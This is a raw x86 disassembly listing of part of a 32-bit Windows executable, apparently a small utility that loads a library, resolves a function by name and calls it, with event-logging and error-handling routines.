  403c57:	push   eax
  403c58:	lea    eax,[ebp-0xa6c]
  403c5e:	push   eax
  403c5f:	call   0x4025c0
  403c64:	lea    esi,[esi+0x8]
  403c67:	mov    eax,DWORD PTR [esi]
  403c69:	test   eax,eax
  403c6b:	jne    0x403c54
  403c6d:	lea    eax,[ebp-0xa6c]
  403c73:	mov    ecx,ebx
  403c75:	push   eax
  403c76:	call   0x404640
  403c7b:	mov    esi,eax
  403c7d:	test   esi,esi
  403c7f:	js     0x403dfb
  403c85:	mov    esi,DWORD PTR ds:0x407554
  403c8b:	lea    eax,[ebp-0x20c]
  403c91:	mov    ebx,0x104
  403c96:	xor    edi,edi
  403c98:	push   ebx
  403c99:	push   eax
  403c9a:	push   esi
  403c9b:	mov    DWORD PTR [ebp-0xa38],edi
  403ca1:	call   DWORD PTR ds:0x408084
  403ca7:	test   eax,eax
  403ca9:	jne    0x403cc2
  403cab:	call   0x401d97
  403cb0:	mov    esi,eax
  403cb2:	lea    ecx,[ebp-0xa38]
  403cb8:	call   0x40461f
  403cbd:	jmp    0x403dfb
  403cc2:	cmp    eax,ebx
  403cc4:	jne    0x403cdb
  403cc6:	lea    ecx,[ebp-0xa38]
  403ccc:	call   0x40461f
  403cd1:	mov    esi,0x8007007a
  403cd6:	jmp    0x403dfb
  403cdb:	lea    eax,[ebp-0x20c]
  403ce1:	mov    edx,0x208
  403ce6:	push   eax
  403ce7:	lea    ecx,[ebp-0xa34]
  403ced:	call   0x401ed4
  403cf2:	test   esi,esi
  403cf4:	je     0x403d09
  403cf6:	push   edi
  403cf7:	call   DWORD PTR ds:0x408074
  403cfd:	cmp    esi,eax
  403cff:	je     0x403d09
  403d01:	lea    eax,[ebp-0xa34]
  403d07:	jmp    0x403d78
  403d09:	push   0x22
  403d0b:	pop    esi
  403d0c:	lea    eax,[ebp-0xa34]
  403d12:	mov    WORD PTR [ebp-0x624],si
  403d19:	push   eax
  403d1a:	mov    edx,0x20b
  403d1f:	lea    ecx,[ebp-0x622]
  403d25:	call   0x401c86
  403d2a:	test   al,al
  403d2c:	jne    0x403d43
  403d2e:	lea    ecx,[ebp-0xa38]
  403d34:	call   0x40461f
  403d39:	mov    esi,0x80004005
  403d3e:	jmp    0x403dfb
  403d43:	lea    ecx,[ebp-0x624]
  403d49:	call   0x401c65
  403d4e:	mov    WORD PTR [ebp+eax*2-0x624],si
  403d56:	lea    eax,[eax*2+0x2]
  403d5d:	cmp    eax,0x418
  403d62:	jae    0x403e1b
  403d68:	xor    ecx,ecx
  403d6a:	mov    WORD PTR [ebp+eax*1-0x624],cx
  403d72:	lea    eax,[ebp-0x624]
  403d78:	push   eax
  403d79:	push   0x401438
  403d7e:	lea    eax,[ebp-0xa6c]
  403d84:	push   eax
  403d85:	call   0x4025c0
  403d8a:	mov    esi,eax
  403d8c:	test   esi,esi
  403d8e:	js     0x403cb2
  403d94:	lea    eax,[ebp-0xa34]
  403d9a:	push   eax
  403d9b:	push   0x401448
  403da0:	lea    eax,[ebp-0xa6c]
  403da6:	push   eax
  403da7:	call   0x4025c0
  403dac:	mov    esi,eax
  403dae:	test   esi,esi
  403db0:	js     0x403cb2
  403db6:	lea    ecx,[ebp-0xa6c]
  403dbc:	mov    eax,DWORD PTR [ebp-0xa40]
  403dc2:	mov    DWORD PTR [ebp-0xa3c],edi
  403dc8:	movzx  eax,ax
  403dcb:	cmp    DWORD PTR [ebp+0x8],edi
  403dce:	je     0x403dd4
  403dd0:	push   0x1
  403dd2:	jmp    0x403dd5
  403dd4:	push   edi
  403dd5:	push   0x401460
  403dda:	push   eax
  403ddb:	lea    eax,[ebp-0x20c]
  403de1:	push   eax
  403de2:	call   0x402630
  403de7:	lea    ecx,[ebp-0xa3c]
  403ded:	mov    esi,eax
  403def:	call   0x40461f
  403df4:	jmp    0x403cb2
  403df9:	mov    esi,eax
  403dfb:	lea    ecx,[ebp-0xa6c]
  403e01:	call   0x40251a
  403e06:	mov    ecx,DWORD PTR [ebp-0x4]
  403e09:	mov    eax,esi
  403e0b:	pop    edi
  403e0c:	pop    esi
  403e0d:	xor    ecx,ebp
  403e0f:	pop    ebx
  403e10:	call   0x405170
  403e15:	mov    esp,ebp
  403e17:	pop    ebp
  403e18:	ret    0x8
  403e1b:	call   0x4053d0
  403e20:	int3   
  403e21:	int3   
  403e22:	int3   
  403e23:	int3   
  403e24:	int3   
  403e25:	int3   
  403e26:	mov    edi,edi
  403e28:	push   ebp
  403e29:	mov    ebp,esp
  403e2b:	push   ecx
  403e2c:	mov    eax,ds:0x40700c
  403e31:	xor    eax,ebp
  403e33:	mov    DWORD PTR [ebp-0x4],eax
  403e36:	push   ebx
  403e37:	mov    ebx,ecx
  403e39:	push   edi
  403e3a:	test   ebx,ebx
  403e3c:	je     0x403e7a
  403e3e:	mov    edi,DWORD PTR [ebx+0x8]
  403e41:	test   edi,edi
  403e43:	je     0x403e66
  403e45:	push   esi
  403e46:	mov    esi,DWORD PTR [edi]
  403e48:	mov    ecx,esi
  403e4a:	push   DWORD PTR [edi+0x4]
  403e4d:	call   DWORD PTR ds:0x4081d8
  403e53:	call   esi
  403e55:	mov    esi,DWORD PTR [edi+0x8]
  403e58:	push   edi
  403e59:	call   0x404d30
  403e5e:	mov    edi,esi
  403e60:	pop    ecx
  403e61:	test   esi,esi
  403e63:	jne    0x403e46
  403e65:	pop    esi
  403e66:	mov    ecx,DWORD PTR [ebp-0x4]
  403e69:	and    DWORD PTR [ebx+0x8],0x0
  403e6d:	xor    ecx,ebp
  403e6f:	pop    edi
  403e70:	pop    ebx
  403e71:	call   0x405170
  403e76:	mov    esp,ebp
  403e78:	pop    ebp
  403e79:	ret    
  403e7a:	mov    ecx,0xc0000005
  403e7f:	call   0x401cc2
  403e84:	int3   
  403e85:	int3   
  403e86:	int3   
  403e87:	int3   
  403e88:	int3   
  403e89:	int3   
  403e8a:	mov    edi,edi
  403e8c:	push   ebp
  403e8d:	mov    ebp,esp
  403e8f:	push   0x0
  403e91:	push   0x4
  403e93:	lea    eax,[ebp+0x10]
  403e96:	push   eax
  403e97:	push   ecx
  403e98:	push   edx
  403e99:	push   0x2b
  403e9b:	push   DWORD PTR [ebp+0xc]
  403e9e:	push   DWORD PTR [ebp+0x8]
  403ea1:	call   DWORD PTR ds:0x408138
  403ea7:	add    esp,0x20
  403eaa:	pop    ebp
  403eab:	ret    0xc
  403eae:	int3   
  403eaf:	int3   
  403eb0:	int3   
  403eb1:	int3   
  403eb2:	int3   
  403eb3:	mov    edi,edi
  403eb5:	push   ebp
  403eb6:	mov    ebp,esp
  403eb8:	mov    edx,DWORD PTR [ebp+0x10]
  403ebb:	push   ebx
  403ebc:	push   esi
  403ebd:	xor    ebx,ebx
  403ebf:	mov    esi,ecx
  403ec1:	push   edi
  403ec2:	test   edx,edx
  403ec4:	je     0x403eec
  403ec6:	cmp    WORD PTR [edx],bx
  403ec9:	jne    0x403ecf
  403ecb:	push   0xe
  403ecd:	jmp    0x403eee
  403ecf:	mov    ecx,edx
  403ed1:	lea    edi,[ecx+0x2]
  403ed4:	mov    ax,WORD PTR [ecx]
  403ed7:	add    ecx,0x2
  403eda:	cmp    ax,bx
  403edd:	jne    0x403ed4
  403edf:	sub    ecx,edi
  403ee1:	sar    ecx,1
  403ee3:	lea    ecx,[ecx*2+0x2]
  403eea:	jmp    0x403eef
  403eec:	push   0xa
  403eee:	pop    ecx
  403eef:	test   edx,edx
  403ef1:	je     0x403eff
  403ef3:	cmp    WORD PTR [edx],bx
  403ef6:	jne    0x403f04
  403ef8:	mov    edx,0x401478
  403efd:	jmp    0x403f04
  403eff:	mov    edx,0x401488
  403f04:	push   ebx
  403f05:	push   0x4
  403f07:	lea    eax,[ebp+0x14]
  403f0a:	push   eax
  403f0b:	push   ecx
  403f0c:	push   edx
  403f0d:	push   esi
  403f0e:	push   0x4015d4
  403f13:	push   0x2b
  403f15:	push   DWORD PTR [ebp+0xc]
  403f18:	push   DWORD PTR [ebp+0x8]
  403f1b:	call   DWORD PTR ds:0x408138
  403f21:	add    esp,0x28
  403f24:	pop    edi
  403f25:	pop    esi
  403f26:	pop    ebx
  403f27:	pop    ebp
  403f28:	ret    0x10
  403f2b:	int3   
  403f2c:	int3   
  403f2d:	int3   
  403f2e:	int3   
  403f2f:	int3   
  403f30:	mov    edi,edi
  403f32:	push   ebp
  403f33:	mov    ebp,esp
  403f35:	mov    ecx,DWORD PTR [ebp+0x10]
  403f38:	push   esi
  403f39:	test   ecx,ecx
  403f3b:	je     0x403f4e
  403f3d:	mov    edx,ecx
  403f3f:	lea    esi,[edx+0x1]
  403f42:	mov    al,BYTE PTR [edx]
  403f44:	inc    edx
  403f45:	test   al,al
  403f47:	jne    0x403f42
  403f49:	sub    edx,esi
  403f4b:	inc    edx
  403f4c:	jmp    0x403f51
  403f4e:	push   0x5
  403f50:	pop    edx
  403f51:	test   ecx,ecx
  403f53:	jne    0x403f5a
  403f55:	mov    ecx,0x401494
  403f5a:	push   0x0
  403f5c:	push   0x4
  403f5e:	lea    eax,[ebp+0x14]
  403f61:	push   eax
  403f62:	push   edx
  403f63:	push   ecx
  403f64:	push   0xd
  403f66:	push   0x4015d4
  403f6b:	push   0x2b
  403f6d:	push   DWORD PTR [ebp+0xc]
  403f70:	push   DWORD PTR [ebp+0x8]
  403f73:	call   DWORD PTR ds:0x408138
  403f79:	add    esp,0x28
  403f7c:	pop    esi
  403f7d:	pop    ebp
  403f7e:	ret    0x10
  403f81:	int3   
  403f82:	int3   
  403f83:	int3   
  403f84:	int3   
  403f85:	int3   
  403f86:	mov    edi,edi
  403f88:	push   ebp
  403f89:	mov    ebp,esp
  403f8b:	push   ecx
  403f8c:	mov    ecx,DWORD PTR [ebp+0x10]
  403f8f:	mov    DWORD PTR [ebp-0x4],0x80070057
  403f96:	push   esi
  403f97:	test   ecx,ecx
  403f99:	je     0x403fac
  403f9b:	mov    edx,ecx
  403f9d:	lea    esi,[edx+0x1]
  403fa0:	mov    al,BYTE PTR [edx]
  403fa2:	inc    edx
  403fa3:	test   al,al
  403fa5:	jne    0x403fa0
  403fa7:	sub    edx,esi
  403fa9:	inc    edx
  403faa:	jmp    0x403faf
  403fac:	push   0x5
  403fae:	pop    edx
  403faf:	test   ecx,ecx
  403fb1:	jne    0x403fb8
  403fb3:	mov    ecx,0x401494
  403fb8:	push   0x0
  403fba:	push   0x4
  403fbc:	lea    eax,[ebp-0x4]
  403fbf:	push   eax
  403fc0:	push   0x1a
  403fc2:	push   0x4014cc
  403fc7:	push   edx
  403fc8:	push   ecx
  403fc9:	push   0xe
  403fcb:	push   0x4015d4
  403fd0:	push   0x2b
  403fd2:	push   DWORD PTR [ebp+0xc]
  403fd5:	push   DWORD PTR [ebp+0x8]
  403fd8:	call   DWORD PTR ds:0x408138
  403fde:	add    esp,0x30
  403fe1:	pop    esi
  403fe2:	mov    esp,ebp
  403fe4:	pop    ebp
  403fe5:	ret    0x14
  403fe8:	int3   
  403fe9:	int3   
  403fea:	int3   
  403feb:	int3   
  403fec:	int3   
  403fed:	int3   
  403fee:	int3   
  403fef:	int3   
  403ff0:	mov    edi,edi
  403ff2:	push   ebp
  403ff3:	mov    ebp,esp
  403ff5:	push   ecx
  403ff6:	mov    eax,DWORD PTR [ebp+0x10]
  403ff9:	push   ebx
  403ffa:	xor    ebx,ebx
  403ffc:	push   esi
  403ffd:	mov    esi,DWORD PTR [ebp+0xc]
  404000:	mov    DWORD PTR [eax],ebx
  404002:	mov    eax,DWORD PTR [ebp+0x8]
  404005:	push   edi
  404006:	sub    eax,0x4
  404009:	je     0x40401d
  40400b:	sub    eax,0x1
  40400e:	je     0x404015
  404010:	push   0x57
  404012:	pop    eax
  404013:	jmp    0x40405d
  404015:	mov    edi,ebx
  404017:	mov    eax,ebx
  404019:	mov    dl,bl
  40401b:	jmp    0x404040
  40401d:	push   DWORD PTR [ebp+0x14]
  404020:	call   DWORD PTR ds:0x408128
  404026:	mov    edi,edx
  404028:	mov    ebx,eax
  40402a:	push   edi
  40402b:	push   ebx
  40402c:	call   DWORD PTR ds:0x408130
  404032:	push   edi
  404033:	push   ebx
  404034:	mov    BYTE PTR [ebp-0x1],al
  404037:	call   DWORD PTR ds:0x408134
  40403d:	mov    dl,BYTE PTR [ebp-0x1]
  404040:	test   BYTE PTR [esi+0x1a],0x2
  404044:	je     0x40404f
  404046:	mov    ecx,DWORD PTR [esi+0x10]
  404049:	test   ecx,ecx
  40404b:	je     0x40404f
  40404d:	mov    esi,ecx
  40404f:	mov    DWORD PTR [esi+0x10],ebx
  404052:	mov    DWORD PTR [esi+0x14],edi
  404055:	mov    BYTE PTR [esi+0x19],dl
  404058:	mov    DWORD PTR [esi+0x1c],eax
  40405b:	xor    eax,eax
  40405d:	pop    edi
  40405e:	pop    esi
  40405f:	pop    ebx
  404060:	mov    esp,ebp
  404062:	pop    ebp
  404063:	ret    0x10
  404066:	int3   
  404067:	int3   
  404068:	int3   
  404069:	int3   
  40406a:	int3   
  40406b:	mov    edi,edi
  40406d:	push   ebp
  40406e:	mov    ebp,esp
  404070:	sub    esp,0xc
  404073:	push   ebx
  404074:	push   esi
  404075:	push   edi
  404076:	xor    edi,edi
  404078:	lea    eax,[ebp-0x4]
  40407b:	push   edi
  40407c:	push   edi
  40407d:	push   eax
  40407e:	push   edi
  40407f:	push   0x1
  404081:	push   DWORD PTR ds:0x407558
  404087:	mov    ebx,0x900
  40408c:	mov    DWORD PTR [ebp-0x4],edi
  40408f:	push   ebx
  404090:	mov    esi,ecx
  404092:	mov    DWORD PTR [ebp-0x8],edi
  404095:	call   DWORD PTR ds:0x40808c
  40409b:	test   eax,eax
  40409d:	jne    0x4040d9
  40409f:	mov    eax,ds:0x407014
  4040a4:	cmp    eax,0x407014
  4040a9:	je     0x404144
  4040af:	test   BYTE PTR [eax+0x1c],0x4
  4040b3:	je     0x404144
  4040b9:	call   0x401d97
  4040be:	push   eax
  4040bf:	mov    eax,ds:0x407014
  4040c4:	push   DWORD PTR [eax+0x14]
  4040c7:	push   DWORD PTR [eax+0x10]
  4040ca:	push   0xa
  4040cc:	mov    edx,0x4015d4
  4040d1:	pop    ecx
  4040d2:	call   0x403e8a
  4040d7:	jmp    0x404144
  4040d9:	push   edi
  4040da:	push   edi
  4040db:	lea    eax,[ebp-0x8]
  4040de:	push   eax
  4040df:	push   edi
  4040e0:	push   0x2
  4040e2:	push   DWORD PTR ds:0x407558
  4040e8:	push   ebx
  4040e9:	call   DWORD PTR ds:0x40808c
  4040ef:	test   eax,eax
  4040f1:	jne    0x404123
  4040f3:	push   DWORD PTR [ebp-0x4]
  4040f6:	call   DWORD PTR ds:0x40805c
  4040fc:	mov    eax,ds:0x407014
  404101:	cmp    eax,0x407014
  404106:	je     0x404144
  404108:	test   BYTE PTR [eax+0x1c],0x4
  40410c:	je     0x404144
  40410e:	call   0x401d97
  404113:	push   eax
  404114:	mov    eax,ds:0x407014
  404119:	push   DWORD PTR [eax+0x14]
  40411c:	push   DWORD PTR [eax+0x10]
  40411f:	push   0xb
  404121:	jmp    0x4040cc
  404123:	push   0x40
  404125:	push   DWORD PTR [ebp-0x4]
  404128:	push   DWORD PTR [ebp-0x8]
  40412b:	push   esi
  40412c:	call   DWORD PTR ds:0x408008
  404132:	push   DWORD PTR [ebp-0x4]
  404135:	call   DWORD PTR ds:0x40805c
  40413b:	push   DWORD PTR [ebp-0x8]
  40413e:	call   DWORD PTR ds:0x40805c
  404144:	pop    edi
  404145:	pop    esi
  404146:	pop    ebx
  404147:	mov    esp,ebp
  404149:	pop    ebp
  40414a:	ret    
  40414b:	int3   
  40414c:	int3   
  40414d:	int3   
  40414e:	int3   
  40414f:	int3   
  404150:	mov    edi,edi
  404152:	push   ebp
  404153:	mov    ebp,esp
  404155:	push   ecx
  404156:	push   ebx
  404157:	push   esi
  404158:	mov    esi,ecx
  40415a:	push   edi
  40415b:	mov    edi,edx
  40415d:	test   esi,esi
  40415f:	je     0x4041d8
  404161:	xor    ebx,ebx
  404163:	cmp    WORD PTR [esi],bx
  404166:	je     0x4041d8
  404168:	test   edi,edi
  40416a:	je     0x4041d8
  40416c:	lea    edx,[ecx+0x2]
  40416f:	mov    ax,WORD PTR [ecx]
  404172:	add    ecx,0x2
  404175:	cmp    ax,bx
  404178:	jne    0x40416f
  40417a:	sub    ecx,edx
  40417c:	sar    ecx,1
  40417e:	lea    ebx,[ecx+0x2]
  404181:	push   ebx
  404182:	call   DWORD PTR ds:0x408028
  404188:	mov    DWORD PTR [edi],eax
  40418a:	test   eax,eax
  40418c:	je     0x4041d4
  40418e:	xor    ecx,ecx
  404190:	push   ecx
  404191:	push   ecx
  404192:	push   ebx
  404193:	push   eax
  404194:	push   0xffffffff
  404196:	push   esi
  404197:	push   0x400
  40419c:	push   ecx
  40419d:	call   DWORD PTR ds:0x4080ec
  4041a3:	mov    DWORD PTR [ebp-0x4],eax
  4041a6:	test   eax,eax
  4041a8:	je     0x4041b5
  4041aa:	mov    ecx,DWORD PTR [edi]
  4041ac:	mov    WORD PTR [ecx+ebx*1-0x2],0x57
  4041b3:	jmp    0x4041e2
  4041b5:	call   DWORD PTR ds:0x408050
  4041bb:	push   DWORD PTR [edi]
  4041bd:	mov    esi,eax
  4041bf:	call   DWORD PTR ds:0x40802c
  4041c5:	and    DWORD PTR [edi],0x0
  4041c8:	push   esi
  4041c9:	call   DWORD PTR ds:0x40804c
  4041cf:	mov    eax,DWORD PTR [ebp-0x4]
  4041d2:	jmp    0x4041e2
  4041d4:	push   0xe
  4041d6:	jmp    0x4041da
  4041d8:	push   0x57
  4041da:	call   DWORD PTR ds:0x40804c
  4041e0:	xor    eax,eax
  4041e2:	pop    edi
  4041e3:	pop    esi
  4041e4:	pop    ebx
  4041e5:	mov    esp,ebp
  4041e7:	pop    ebp
  4041e8:	ret    
  4041e9:	int3   
  4041ea:	int3   
  4041eb:	int3   
  4041ec:	int3   
  4041ed:	int3   
  4041ee:	int3   
  4041ef:	int3   
  4041f0:	mov    edi,edi
  4041f2:	push   ebp
  4041f3:	mov    ebp,esp
  4041f5:	pop    ebp
  4041f6:	jmp    DWORD PTR ds:0x408014
  4041fc:	int3   
  4041fd:	int3   
  4041fe:	int3   
  4041ff:	int3   
  404200:	int3   
  404201:	mov    edi,edi
  404203:	push   ebp
  404204:	mov    ebp,esp
  404206:	and    esp,0xfffffff8
  404209:	sub    esp,0x4c
  40420c:	mov    eax,ds:0x40700c
  404211:	xor    eax,esp
  404213:	mov    DWORD PTR [esp+0x48],eax
  404217:	push   ebx
  404218:	xor    edx,edx
  40421a:	push   esi
  40421b:	push   edi
  40421c:	mov    DWORD PTR [esp+0x24],edx
  404220:	mov    DWORD PTR [esp+0x18],edx
  404224:	mov    esi,0x4074f0
  404229:	mov    DWORD PTR ds:0x407500,edx
  40422f:	mov    DWORD PTR ds:0x4074f0,edx
  404235:	mov    edi,0x407518
  40423a:	mov    DWORD PTR ds:0x407508,0x1
  404244:	mov    DWORD PTR ds:0x40750c,edx
  40424a:	mov    DWORD PTR ds:0x407518,0x4015c4
  404254:	mov    DWORD PTR ds:0x407014,esi
  40425a:	mov    ecx,DWORD PTR [edi]
  40425c:	lea    eax,[esi+0x8]
  40425f:	push   eax
  404260:	push   edx
  404261:	push   edx
  404262:	lea    eax,[esp+0x28]
  404266:	mov    DWORD PTR [esp+0x28],ecx
  40426a:	push   eax
  40426b:	push   0x1
  40426d:	push   ecx
  40426e:	push   esi
  40426f:	mov    DWORD PTR [esp+0x3c],edx
  404273:	lea    edi,[edi+0x4]
  404276:	push   0x403ff0
  40427b:	mov    DWORD PTR [esi+0x20],ecx
  40427e:	call   DWORD PTR ds:0x40813c
  404284:	mov    esi,DWORD PTR [esi]
  404286:	push   0x0
  404288:	pop    edx
  404289:	test   esi,esi
  40428b:	jne    0x40425a
  40428d:	mov    ebx,DWORD PTR [ebp+0x8]
  404290:	mov    ecx,ebx
  404292:	push   0x7b
  404294:	pop    edx
  404295:	call   0x404b5d
  40429a:	push   0x9
  40429c:	pop    ecx
  40429d:	xor    esi,esi
  40429f:	lea    edi,[esp+0x30]
  4042a3:	xor    eax,eax
  4042a5:	mov    DWORD PTR [esp+0x2c],esi
  4042a9:	push   0x2710
  4042ae:	rep stos DWORD PTR es:[edi],eax
  4042b0:	push   ebx
  4042b1:	mov    DWORD PTR [esp+0x38],0x4041f0
  4042b9:	mov    DWORD PTR [esp+0x44],ebx
  4042bd:	call   DWORD PTR ds:0x408020
  4042c3:	push   0x7f00
  4042c8:	push   esi
  4042c9:	mov    DWORD PTR [esp+0x48],eax
  4042cd:	call   DWORD PTR ds:0x40800c
  4042d3:	mov    DWORD PTR [esp+0x44],eax
  4042d7:	mov    edi,0x40149c
  4042dc:	lea    eax,[esp+0x2c]
  4042e0:	mov    DWORD PTR [esp+0x48],0x6
  4042e8:	push   eax
  4042e9:	mov    DWORD PTR [esp+0x3c],0x4
  4042f1:	mov    DWORD PTR [esp+0x54],edi
  4042f5:	call   DWORD PTR ds:0x408010
  4042fb:	lea    ecx,[esp+0x14]
  4042ff:	mov    DWORD PTR [esp+0x14],esi
  404303:	call   0x404add
  404308:	test   eax,eax
  40430a:	je     0x4045d4
  404310:	call   0x404b4a
  404315:	push   esi
  404316:	push   ebx
  404317:	push   esi
  404318:	push   esi
  404319:	push   esi
  40431a:	push   esi
  40431b:	mov    eax,0x80000000
  404320:	push   eax
  404321:	push   eax
  404322:	push   esi
  404323:	push   0x4015c0
  404328:	push   edi
  404329:	push   0x80
  40432e:	call   DWORD PTR ds:0x408018
  404334:	mov    ecx,DWORD PTR [esp+0x14]
  404338:	mov    edi,eax
  40433a:	mov    DWORD PTR [esp+0xc],edi
  40433e:	call   0x404b37
  404343:	test   edi,edi
  404345:	je     0x4045d4
  40434b:	lea    eax,[esp+0x18]
  40434f:	push   eax
  404350:	push   DWORD PTR [ebp+0x10]
  404353:	call   DWORD PTR ds:0x408144
  404359:	mov    ebx,eax
  40435b:	test   ebx,ebx
  40435d:	je     0x404536
  404363:	cmp    DWORD PTR [esp+0x18],0x1
  404368:	jle    0x4044fa
  40436e:	push   esi
  40436f:	push   esi
  404370:	push   0x4014cc
  404375:	call   DWORD PTR ds:0x40806c
  40437b:	mov    esi,eax
  40437d:	mov    DWORD PTR [esp+0x1c],esi
  404381:	test   esi,esi
  404383:	je     0x4044c6
  404389:	mov    ecx,esi
  40438b:	call   0x40488e
  404390:	mov    DWORD PTR [esp+0x28],eax
  404394:	test   eax,eax
  404396:	je     0x404488
  40439c:	mov    ecx,DWORD PTR [ebx]
  40439e:	lea    edx,[esp+0x10]
  4043a2:	xor    eax,eax
  4043a4:	mov    DWORD PTR [esp+0x10],eax
  4043a8:	call   0x404150
  4043ad:	test   eax,eax
  4043af:	je     0x40444e
  4043b5:	mov    edi,DWORD PTR [esp+0x10]
  4043b9:	push   edi
  4043ba:	push   esi
  4043bb:	call   DWORD PTR ds:0x408078
  4043c1:	mov    esi,eax
  4043c3:	test   esi,esi
  4043c5:	je     0x40441f
  4043c7:	mov    ecx,DWORD PTR [ebx]
  4043c9:	lea    edx,[ecx+0x2]
  4043cc:	mov    ax,WORD PTR [ecx]
  4043cf:	add    ecx,0x2
  4043d2:	cmp    ax,WORD PTR [esp+0x24]
  4043d7:	jne    0x4043cc
  4043d9:	mov    eax,DWORD PTR [ebp+0x10]
  4043dc:	sub    ecx,edx
  4043de:	push   DWORD PTR [ebp+0x14]
  4043e1:	sar    ecx,1
  4043e3:	lea    eax,[eax+ecx*2]
  4043e6:	mov    ecx,esi
  4043e8:	add    eax,0x2
  4043eb:	push   eax
  4043ec:	push   DWORD PTR [ebp+0x8]
  4043ef:	push   DWORD PTR [esp+0x18]
  4043f3:	call   DWORD PTR ds:0x4081d8
  4043f9:	call   esi
  4043fb:	mov    ecx,DWORD PTR ds:0x407014
  404401:	mov    esi,0x407014
  404406:	cmp    ecx,esi
  404408:	je     0x404441
  40440a:	test   BYTE PTR [ecx+0x1c],0x10
  40440e:	je     0x404441
  404410:	push   eax
  404411:	push   edi
  404412:	push   DWORD PTR [ecx+0x14]
  404415:	push   DWORD PTR [ecx+0x10]
  404418:	call   0x403f30
  40441d:	jmp    0x404441
  40441f:	mov    eax,ds:0x407014
  404424:	mov    esi,0x407014
  404429:	cmp    eax,esi
  40442b:	je     0x404441
  40442d:	test   BYTE PTR [eax+0x1c],0x8
  404431:	je     0x404441
  404433:	push   ecx
  404434:	push   ecx
  404435:	push   edi
  404436:	push   DWORD PTR [eax+0x14]
  404439:	push   DWORD PTR [eax+0x10]
  40443c:	call   0x403f86
  404441:	push   edi
  404442:	call   DWORD PTR ds:0x40802c
  404448:	mov    edi,DWORD PTR [esp+0xc]
  40444c:	jmp    0x40447d
  40444e:	mov    eax,ds:0x407014
  404453:	mov    esi,0x407014
  404458:	cmp    eax,esi
  40445a:	je     0x40447d
  40445c:	test   BYTE PTR [eax+0x1c],0x4
  404460:	je     0x40447d
  404462:	call   0x401d97
  404467:	push   eax
  404468:	push   DWORD PTR [ebx]
  40446a:	mov    eax,ds:0x407014
  40446f:	push   DWORD PTR [eax+0x14]
  404472:	push   DWORD PTR [eax+0x10]
  404475:	push   0xf
  404477:	pop    ecx
  404478:	call   0x403eb3
  40447d:	lea    ecx,[esp+0x28]
  404481:	call   0x404a40
  404486:	jmp    0x4044ba
  404488:	mov    eax,ds:0x407014
  40448d:	mov    esi,0x407014
  404492:	cmp    eax,esi
  404494:	je     0x4044ba
  404496:	test   BYTE PTR [eax+0x1c],0x4
  40449a:	je     0x4044ba
  40449c:	call   0x401d97
  4044a1:	push   eax
  4044a2:	mov    eax,ds:0x407014
  4044a7:	push   0x4014cc
  4044ac:	push   DWORD PTR [eax+0x14]
  4044af:	push   DWORD PTR [eax+0x10]
  4044b2:	push   0x10
  4044b4:	pop    ecx
  4044b5:	call   0x403eb3
  4044ba:	push   DWORD PTR [esp+0x1c]
  4044be:	call   DWORD PTR ds:0x408064
  4044c4:	jmp    0x40452d
  4044c6:	mov    eax,ds:0x407014
  4044cb:	mov    esi,0x407014
  4044d0:	cmp    eax,esi
  4044d2:	je     0x40452d
  4044d4:	test   BYTE PTR [eax+0x1c],0x4
  4044d8:	je     0x40452d
  4044da:	call   0x401d97
  4044df:	push   eax
  4044e0:	mov    eax,ds:0x407014
  4044e5:	push   0x4014cc
  4044ea:	push   DWORD PTR [eax+0x14]
  4044ed:	push   DWORD PTR [eax+0x10]
  4044f0:	push   0x11
  4044f2:	pop    ecx
  4044f3:	call   0x403eb3
  4044f8:	jmp    0x40452d
  4044fa:	mov    eax,ds:0x407014
  4044ff:	mov    esi,0x407014
  404504:	cmp    eax,esi
  404506:	je     0x404526
  404508:	test   BYTE PTR [eax+0x1c],0x8
  40450c:	je     0x404526
  40450e:	push   0x80070057
  404513:	push   DWORD PTR [eax+0x14]
  404516:	mov    edx,0x4015d4
  40451b:	push   DWORD PTR [eax+0x10]
  40451e:	push   0x12
  404520:	pop    ecx
  404521:	call   0x403e8a
  404526:	mov    ecx,edi
  404528:	call   0x40406b
  40452d:	push   ebx
  40452e:	call   DWORD PTR ds:0x40805c
  404534:	jmp    0x404568
  404536:	mov    eax,ds:0x407014
  40453b:	mov    esi,0x407014
  404540:	cmp    eax,esi
  404542:	je     0x404568
  404544:	test   BYTE PTR [eax+0x1c],0x4
  404548:	je     0x404568
  40454a:	call   0x401d97
  40454f:	push   eax
  404550:	mov    eax,ds:0x407014
  404555:	mov    edx,0x4015d4
  40455a:	push   DWORD PTR [eax+0x14]
  40455d:	push   DWORD PTR [eax+0x10]
  404560:	push   0x13
  404562:	pop    ecx
  404563:	call   0x403e8a
  404568:	push   edi
  404569:	call   DWORD PTR ds:0x40801c
  40456f:	mov    eax,ds:0x407018
  404574:	cmp    eax,0xffffffff
  404577:	je     0x404587
  404579:	push   eax
  40457a:	call   DWORD PTR ds:0x4080e0
  404580:	or     DWORD PTR ds:0x407018,0xffffffff
  404587:	cmp    DWORD PTR ds:0x40754c,0x0
  40458e:	je     0x404597
  404590:	or     DWORD PTR ds:0x40754c,0xffffffff
  404597:	mov    edi,DWORD PTR ds:0x407014
  40459d:	cmp    edi,esi
  40459f:	je     0x404604
  4045a1:	test   edi,edi
  4045a3:	je     0x4045cc
  4045a5:	xor    esi,esi
  4045a7:	mov    eax,DWORD PTR [edi+0x8]
  4045aa:	or     eax,DWORD PTR [edi+0xc]
  4045ad:	je     0x4045c1
  4045af:	push   DWORD PTR [edi+0xc]
  4045b2:	push   DWORD PTR [edi+0x8]
  4045b5:	call   DWORD PTR ds:0x40812c
  4045bb:	mov    DWORD PTR [edi+0x8],esi
  4045be:	mov    DWORD PTR [edi+0xc],esi
  4045c1:	mov    edi,DWORD PTR [edi]
  4045c3:	test   edi,edi
  4045c5:	jne    0x4045a7
  4045c7:	mov    esi,0x407014
  4045cc:	mov    DWORD PTR ds:0x407014,esi
  4045d2:	jmp    0x404604
  4045d4:	mov    eax,ds:0x407014
  4045d9:	cmp    eax,0x407014
  4045de:	je     0x404604
  4045e0:	test   BYTE PTR [eax+0x1c],0x4
  4045e4:	je     0x404604
  4045e6:	call   0x401d97
  4045eb:	push   eax
  4045ec:	mov    eax,ds:0x407014
  4045f1:	mov    edx,0x4015d4
  4045f6:	push   DWORD PTR [eax+0x14]
  4045f9:	push   DWORD PTR [eax+0x10]
  4045fc:	push   0xc
  4045fe:	pop    ecx
  4045ff:	call   0x403e8a
  404604:	mov    ecx,DWORD PTR [esp+0x54]
  404608:	xor    eax,eax
  40460a:	pop    edi
  40460b:	pop    esi
  40460c:	pop    ebx
  40460d:	xor    ecx,esp
  40460f:	call   0x405170
  404614:	mov    esp,ebp
  404616:	pop    ebp
